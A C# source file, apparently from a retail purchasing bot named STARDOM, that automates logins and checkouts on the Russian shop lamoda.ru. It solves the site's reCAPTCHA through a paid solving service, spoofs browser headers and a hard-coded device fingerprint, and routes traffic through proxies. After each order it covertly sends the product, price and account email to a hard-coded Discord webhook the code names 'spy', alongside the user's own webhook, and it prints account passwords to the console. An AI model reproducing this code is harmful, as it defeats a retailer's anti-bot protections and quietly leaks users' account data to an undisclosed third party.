using Discord;
using Discord.Webhook;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace STDAPP
{
    public class LamodaTaskClass
    {

        public async Task ShowStatus(string ShowLog, TaskPage mytask)
        {
            await App.Current.Dispatcher.Invoke(async () =>
            {
                mytask.Status.Content = ShowLog;

            });
        }

        public async Task WriteLog(string ShowLog, LogWindow log)
        {
            await App.Current.Dispatcher.Invoke(async () =>
            {
                log.LogTextBlock.Text += DateTime.Now + " - " + ShowLog + "\n";

            });
        }

        private static string MakeCaptcha(CancellationToken token)
        {
            HttpRequest request = new HttpRequest();
            string API_KEY = File.ReadAllText(DefinePaths.pathCapMonster);
            var jsondata = new
            {
                clientKey = API_KEY
            };

            string json_data = JsonConvert.SerializeObject(jsondata);
            HttpResponse responseCap = request.Post("https://api.capmonster.cloud/getBalance", json_data, "application/json");
            JObject joResponse = JObject.Parse(responseCap.ToString());
            Console.WriteLine(joResponse);

            var jsondata_2 = new
            {
                clientKey = API_KEY,
                task = new
                {
                    type = "NoCaptchaTaskProxyless",
                    websiteURL = "https://www.lamoda.ru/",
                    websiteKey = "6LcCcfISAAAAAGsXZrTGmEiFFResG_0d_xfCo4Ha"
                }
            };
            json_data = JsonConvert.SerializeObject(jsondata_2);
            responseCap = request.Post("https://api.capmonster.cloud/createTask", json_data, "application/json");
            joResponse = JObject.Parse(responseCap.ToString());
            Console.WriteLine(joResponse);
            string taskId = joResponse["taskId"].ToString();


            var jsondata_3 = new
            {
                clientKey = API_KEY,
                taskId = taskId
            };
            json_data = JsonConvert.SerializeObject(jsondata_3);
            string captchaResp = "";
            while (true)
            {
                if (token.IsCancellationRequested)
                {
                    Console.WriteLine("Stoped");
                    token.ThrowIfCancellationRequested();
                }

                responseCap = request.Post("https://api.capmonster.cloud/getTaskResult/", json_data, "application/json");
                joResponse = JObject.Parse(responseCap.ToString());
                Console.WriteLine(joResponse);
                if (joResponse["status"].ToString() == "ready")
                {
                    captchaResp = joResponse["solution"]["gRecaptchaResponse"].ToString();
                    break;
                }
                System.Threading.Thread.Sleep(500);
            }
            return captchaResp;
        }


        private string[] wordsP = new string[5];
        private string[] words = new string[3];

        private string ClearString(string old)
        {
            StringBuilder CityInputBuild = new StringBuilder();
            foreach (var c in old)
            {
                if (Char.IsLetterOrDigit(c) || Char.IsPunctuation(c))
                    CityInputBuild.Append(c);
            }
            Console.WriteLine(CityInputBuild);
            return CityInputBuild.ToString();
        }
        public async void Src(int i, TaskPage mytask, DataSourceStructures.DataGive dataGive, CancellationToken token, LogWindow log)
        {
            try
            {
                HttpRequest request = new HttpRequest();

                await ShowStatus("Starting", mytask);
                await WriteLog("Starting", log);
                void CheckStopedTask()
                {
                    if (token.IsCancellationRequested)
                    {
                        Console.WriteLine("Stoped");
                        token.ThrowIfCancellationRequested();
                    }
                }

                if (dataGive.Proxy != null)
                {
                    try
                    {
                        request.Proxy = HttpProxyClient.Parse(dataGive.Proxy);
                        Console.WriteLine(request.Proxy);
                    }
                    catch
                    {
                        await ShowStatus("Failed proxy", mytask);
                    }
                }

                request.Cookies = new CookieStorage();
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.0 Safari/537.36";





                //Пока что сделал только чекаут через пвз, с адресом ебка
                //Это все датагив, на самом деле можно пункт выдачи и город перенести в профиль, а не в создании таска хранить
                words = dataGive.Account.Split(':');
                string PICKUP_TITLE = dataGive.Prof.Adress;
                string EMAIL = words[0];
                string FIRST_NAME = ClearString(dataGive.Prof.Name);
                string LAST_NAME = ClearString(dataGive.Prof.SecondName);
                string PHONE = ClearString(dataGive.Prof.Phone);
                string CITY = ClearString(dataGive.Prof.City);

                PHONE = "+7" + PHONE;
                Console.WriteLine(FIRST_NAME);
                Console.WriteLine(LAST_NAME);
                Console.WriteLine(PHONE);
                Console.WriteLine(CITY);
                Console.WriteLine(EMAIL);
                Console.WriteLine(PICKUP_TITLE);

                //hello request
                //========================================================
                //========================================================
                await WriteLog("Making hello request", log);
                HttpResponse httpresp = request.Get("https://www.lamoda.ru/");
                string resp = httpresp.ToString();
                Console.WriteLine(resp);


                httpresp = request.Get("https://www.lamoda.ru/customer/csrf_token");
                resp = httpresp.ToString();
                Console.WriteLine(resp);
                string kek = "";
                foreach (Cookie cok in request.Cookies.GetCookies("https://www.lamoda.ru"))
                {
                    Console.WriteLine(cok.Name + ":" + cok.Value);
                    if (cok.Name == "csrftoken") kek = cok.Value;
                }

                //get aoid(cityId) request
                //========================================================
                //========================================================
                await WriteLog("Getting city", log);
                await ShowStatus("Getting city", mytask);
                request.AddHeader("Host", "www.lamoda.ru");
                request.AddHeader("method", "POST");
                request.AddHeader("path", "/security/spa/checkcatpcharequirements");
                request.AddHeader("accept", "application/json, text/plain");
                request.AddHeader("origin", "https://www.lamoda.ru");
                request.AddHeader("referer", "https://www.lamoda.ru/men-home");
                request.AddHeader("sec-ch-ua", "Not;A Brand\"; v = \"99\", \"Google Chrome\"; v = \"91\", \"Chromium\"; v = \"91\"");
                request.AddHeader("sec-ch-ua-mobile", "?0");
                request.AddHeader("sec-fetch-dest", "empty");
                request.AddHeader("sec-fetch-mode", "cors");
                request.AddHeader("sec-fetch-site", "same-origin");



                httpresp = request.Get($"https://www.lamoda.ru/api/v1/cities/suggest?query={CITY}");
                resp = httpresp.ToString();
                Console.WriteLine(resp);
                JArray jAr = JArray.Parse(httpresp.ToString());
                string aoid = jAr[0]["aoid"].ToString();
                Console.WriteLine("aoid" + aoid);


                //get pickup request
                //========================================================
                //========================================================
                await WriteLog("Getting pickup", log);
                await ShowStatus("Getting pickup", mytask);
                request.AddHeader("Host", "www.lamoda.ru");
                request.AddHeader("method", "POST");
                request.AddHeader("path", "/security/spa/checkcatpcharequirements");
                request.AddHeader("accept", "application/json, text/plain");
                request.AddHeader("origin", "https://www.lamoda.ru");
                request.AddHeader("referer", "https://www.lamoda.ru/men-home");
                request.AddHeader("sec-ch-ua", "Not;A Brand\"; v = \"99\", \"Google Chrome\"; v = \"91\", \"Chromium\"; v = \"91\"");
                request.AddHeader("sec-ch-ua-mobile", "?0");
                request.AddHeader("sec-fetch-dest", "empty");
                request.AddHeader("sec-fetch-mode", "cors");
                request.AddHeader("sec-fetch-site", "same-origin");

                httpresp = request.Get($"https://www.lamoda.ru/api/v1/pickups/list?city_aoid={aoid}&limit=3000&offset=0&ignore_cart=true&only_with_tryon=false&only_with_bankcard=false");
                resp = httpresp.ToString();
                Console.WriteLine(resp);
                jAr = JArray.Parse(httpresp.ToString());
                string pickup_id = "";
                string pickup_type = "";
                foreach (JObject pick in jAr)
                {
                    if (PICKUP_TITLE.Contains(pick["title"].ToString()))
                    {
                        pickup_id = pick["id"].ToString();
                        pickup_type = pick["type"].ToString();
                    }
                }


                //login request
                //========================================================
                //========================================================
                CheckStopedTask(); // check pause
                Console.WriteLine("Make Captcha");
                await WriteLog("Making Captcha", log);
                await ShowStatus("Solving Captcha", mytask);

                string captchaResp = MakeCaptcha(token);
                await WriteLog("Captcha got", log);
                System.Threading.Thread.Sleep(1000);
                request.AddHeader("Host", "www.lamoda.ru");
                request.AddHeader("method", "POST");
                request.AddHeader("path", "/security/spa/checkcatpcharequirements");
                request.AddHeader("accept", "application/json, text/plain");
                request.AddHeader("origin", "https://www.lamoda.ru");
                request.AddHeader("referer", "https://www.lamoda.ru/men-home");
                request.AddHeader("sec-ch-ua", "Not;A Brand\"; v = \"99\", \"Google Chrome\"; v = \"91\", \"Chromium\"; v = \"91\"");
                request.AddHeader("sec-ch-ua-mobile", "?0");
                request.AddHeader("sec-fetch-dest", "empty");
                request.AddHeader("sec-fetch-mode", "cors");
                request.AddHeader("sec-fetch-site", "same-origin");
                words = dataGive.Account.Split(':', '\n', '\t', '\r');
                Console.WriteLine(words[0] + ":" + words[1]);
                string json = $"{{\"email\":\"{words[0]}\",\"password\":\"{words[1]}\",\"g-recaptcha-response\":\"{captchaResp}\"}}";

                CheckStopedTask(); // check pause

                await ShowStatus("Login", mytask);
                await WriteLog("Making login request", log);
                httpresp = request.Post("https://www.lamoda.ru/api/v1/customer/auth", json, "application/json");
                resp = httpresp.ToString();
                await WriteLog("login response - " + resp, log);
                JObject JO = JObject.Parse(resp);
                Console.WriteLine(JO);
                string st = JO.ToString();
                JToken PhoneShow = JObject.Parse(st)["phone"];
                string SubmitedNumber = PhoneShow.ToString();
                Console.WriteLine(SubmitedNumber);
                if (SubmitedNumber == "")
                {
                    await WriteLog("No mobile phone in login data", log);
                    await ShowStatus("Not submited phone", mytask);
                    return;
                }
                await WriteLog("Successful login", log);
                System.Threading.Thread.Sleep(2000);
                CheckStopedTask(); // check pause

                //Monitoring  request
                //========================================================
                //========================================================
                string link = dataGive.ProductLink;
                Console.WriteLine(link);
                string sku = Regex.Match(link, @"/p/(.*?)/").Groups[1].Value.ToUpper();
                Console.WriteLine(sku);
                await ShowStatus("Monitoring...", mytask);
                httpresp = request.Get("https://www.lamoda.ru/");
                await WriteLog("Monitoring", log);
                bool sizeAvailable = true;
                var random = new Random();
                string sku_2 = "";
                string size = "";
                JObject joResponse = new JObject();

                while (sizeAvailable)
                {
                    httpresp = request.Get($"https://www.lamoda.ru/api/v1/products/get?skus={sku}");
                    joResponse = JObject.Parse(httpresp.ToString());
                    Console.WriteLine(joResponse);
                    if (joResponse["products"][0]["sizes"].Count() > 0)
                    {
                        if (dataGive.Size == "Random(Lamoda)")
                        {
                            int index = random.Next(joResponse["products"][0]["sizes"].Count());
                            sku_2 = joResponse["products"][0]["sizes"][index]["sku"].ToString();
                            size = joResponse["products"][0]["sizes"][index]["brand_title"].ToString();
                            sizeAvailable = false;
                        }
                        else
                        {

                            string[] splited = dataGive.Size.Split(", ".ToCharArray());
                            foreach (JObject l in joResponse["products"][0]["sizes"])
                            {
                                foreach (string s in splited)
                                {
                                    if (l["brand_title"].ToString() == s.Replace(".", ","))
                                    {
                                        sku_2 = l["sku"].ToString();
                                        sizeAvailable = false;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    CheckStopedTask(); // check pause
                }

                await WriteLog("Available!", log);
                string price = joResponse["products"][0]["price"].ToString();
                string title = joResponse["products"][0]["model_title"].ToString();
                string img = joResponse["products"][0]["thumbnail"].ToString();


                //Add to cart request
                //========================================================
                //========================================================



                foreach (Cookie cok in request.Cookies.GetCookies("https://www.lamoda.ru"))
                {
                    Console.WriteLine(cok.Name + ":" + cok.Value);
                }
                request.AddHeader("Host", "www.lamoda.ru");
                request.AddHeader("path", "/security/spa/checkcatpcharequirements");
                request.AddHeader("origin", "https://www.lamoda.ru");
                request.AddHeader("referer", dataGive.ProductLink);
                request.AddHeader("sec-ch-ua", "Not;A Brand\"; v = \"99\", \"Google Chrome\"; v = \"91\", \"Chromium\"; v = \"91\"");
                request.AddHeader("sec-ch-ua-mobile", "?0");
                request.AddHeader("sec-fetch-dest", "empty");
                request.AddHeader("sec-fetch-mode", "cors");
                request.AddHeader("sec-fetch-site", "same-origin");
                request.AddHeader("X-Requested-With", "XMLHttpRequest");
                request.AddHeader("X-CSRFToken", kek);

                request.Cookies.Set("csrftoken", kek, "www.lamoda.ru", "/");
                request.Cookies.Set("XCookieNotifyWasShown", "true", "www.lamoda.ru", "/");
                await WriteLog("Cookie set", log);

                await ShowStatus("Add to cart", mytask);
                await WriteLog("Adding to cart!", log);
                Console.WriteLine(sku_2);
                httpresp = request.Post($"https://www.lamoda.ru/cart/add/{sku_2}");
                resp = httpresp.ToString();
                Console.WriteLine(resp);

                foreach (Cookie cok in request.Cookies.GetCookies("https://www.lamoda.ru"))
                {
                    Console.WriteLine(cok.Name + ":" + cok.Value);
                }


                //phone_ver request
                //========================================================
                //========================================================
                await ShowStatus("Checkouting(1/2)", mytask);
                await WriteLog("Checkouting(1/2)", log);
                request.AddHeader("Host", "www.lamoda.ru");
                request.AddHeader("path", "/security/spa/checkcatpcharequirements");
                request.AddHeader("origin", "https://www.lamoda.ru");
                request.AddHeader("referer", dataGive.ProductLink);
                request.AddHeader("sec-ch-ua", "Not;A Brand\"; v = \"99\", \"Google Chrome\"; v = \"91\", \"Chromium\"; v = \"91\"");
                request.AddHeader("sec-ch-ua-mobile", "?0");
                request.AddHeader("sec-fetch-dest", "empty");
                request.AddHeader("sec-fetch-mode", "cors");
                request.AddHeader("sec-fetch-site", "same-origin");
                request.AddHeader("X-Requested-With", "XMLHttpRequest");
                request.AddHeader("X-CSRFToken", kek);

                Console.WriteLine(PHONE);
                httpresp = request.Get($"https://www.lamoda.ru/api/v1/customer/check_phone_verification?phone=%2B{PHONE.Remove(0, 1)}");
                resp = httpresp.ToString();
                Console.WriteLine("OKKK");
                Console.WriteLine(resp);

                captchaResp = MakeCaptcha(token);
                CheckStopedTask(); // check pause
                Console.WriteLine(captchaResp);


                string json_string = $"{{\"location\":\"a.checkout_sub\",\"city_aoid\":\"{aoid}\",\"checkout_type\":\"full\",\"customer\":{{\"email\":\"{EMAIL}\",\"first_name\":\"{FIRST_NAME}\",\"last_name\":\"{LAST_NAME}\",\"middle_name\":\"\",\"phone\":\"{PHONE}\"}},\"subscribe\":true,\"note\":\"\",\"payment_methods\":[{{\"cart_package_id\":\"1___1\",\"payment_method_code\":\"BertelsmannCod\"}}],\"device_data\":{{\"adid\":null,\"app_version\":null,\"platform\":null,\"platform_version\":null,\"device_type\":null,\"device_info\":null,\"screen_info\":null,\"local_datetime\":null}},\"address\":{{\"apartment\":\"\",\"city\":\"г. {CITY}\",\"city_aoid\":\"{aoid}\"}},\"delivery\":{{\"type\":\"pickup\",\"service_level_code\":\"economy\",\"pickup_code\":\"{pickup_type}\",\"pickup_type\":\"{pickup_type}\",\"pickup_id\":\"{pickup_id}\"}},\"affiliates\":{{}},\"masterpass\":{{\"fingerprint\":\"RGV2aWNlSWQ9MzU3ZGJjNDgtNjBiNC00ZTFiLTJmNGEtMDk3ODViM2E5OTdhfHx8dXNlcl9hZ2VudD1Nb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjo5MS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzkxLjB8fHxsYW5ndWFnZT1ydS1SVXx8fGNvbG9yX2RlcHRoPTI0fHx8cGl4ZWxfcmF0aW89MXx8fGhhcmR3YXJlX2NvbmN1cnJlbmN5PTh8fHxyZXNvbHV0aW9uPTEyODAsMTAyNHx8fGF2YWlsYWJsZV9yZXNvbHV0aW9uPTEyODAsOTg0fHx8dGltZXpvbmVfb2Zmc2V0PS0xODB8fHxzZXNzaW9uX3N0b3JhZ2U9MXx8fGxvY2FsX3N0b3JhZ2U9MXx8fGluZGV4ZWRfZGI9MXx8fGNwdV9jbGFzcz11bmtub3dufHx8bmF2aWdhdG9yX3BsYXRmb3JtPVdpbjMyfHx8ZG9fbm90X3RyYWNrPXVuc3BlY2lmaWVkfHx8cmVndWxhcl9wbHVnaW5zPTB8fHxjYW52YXM9MTIxNjEzMzIwMnx8fHdlYmdsPS00MjA3NDg2MHx8fGFkYmxvY2s9ZmFsc2V8fHxoYXNfbGllZF9sYW5ndWFnZXM9ZmFsc2V8fHxoYXNfbGllZF9yZXNvbHV0aW9uPWZhbHNlfHx8aGFzX2xpZWRfb3M9ZmFsc2V8fHxoYXNfbGllZF9icm93c2VyPWZhbHNlfHx8dG91Y2hfc3VwcG9ydD0wLGZhbHNlLGZhbHNlfHx8anNfZm9udHM9LTg4MjM2NDE2Mg==\"}},\"is_phone_verification_supported\":true,\"g-recaptcha-response\":\"{captchaResp}\"}}";
                await WriteLog("Making captcha  ", log);
                await WriteLog("Captcha  got ", log);


                //order_create request
                //========================================================
                //========================================================
                await ShowStatus("Checkouting(2/2)", mytask);
                await WriteLog("Checkouting(2/2)", log);
                httpresp = request.Post("https://www.lamoda.ru/api/v1/orders/create", json_string, "application/json");
                resp = httpresp.ToString();
                Console.WriteLine("poshlo-poehalo");
                Console.WriteLine(resp);


                await ShowStatus("Checkouted", mytask);
                await WriteLog("Checkouted", log);
                string pathApi = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/STARDOM/discord.hook";
                string api = System.IO.File.ReadAllText(pathApi);
                var user = new DiscordWebhookClient(api);
                var spy = new DiscordWebhookClient("https://discordapp.com/api/webhooks/757679702650519632/6SyMIC68oq9Bj_bW5wYlib4KeHq0ECZ-KZZK6UCZfz7AILtgBul-i0JZGWCfSjeeYniF");
                EmbedBuilder eb = new EmbedBuilder();

                eb.WithTitle("CHECKOUT");
                eb.AddField("Product", $"[{title}]({dataGive.ProductLink})");
                eb.AddField("Price", price);
                if (dataGive.Size == "Random(Lamoda)")
                {
                    eb.AddField("Size", size);
                }
                else
                {
                    eb.AddField("Size", dataGive.Size);
                }
                eb.WithColor(0, 255, 0);
                eb.AddField("Account", "||" + words[0] + "||");
                eb.WithThumbnailUrl($"https://a.lmcdn.ru/product{img}");
                eb.WithFooter("STARDOM");
                eb.WithCurrentTimestamp();
                await user.SendMessageAsync(embeds: new List<Embed>() { eb.Build() });
                await spy.SendMessageAsync(embeds: new List<Embed>() { eb.Build() });

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                if (ex.ToString().Contains("System.OperationCanceledException"))
                {
                    await ShowStatus("Stopped", mytask);
                    await WriteLog("Task stopped ", log);
                }
                else
                {
                    await ShowStatus("Task failed", mytask);
                    await WriteLog("Task failed, exeption  - " + ex, log);
                }

            }
        }

    }
}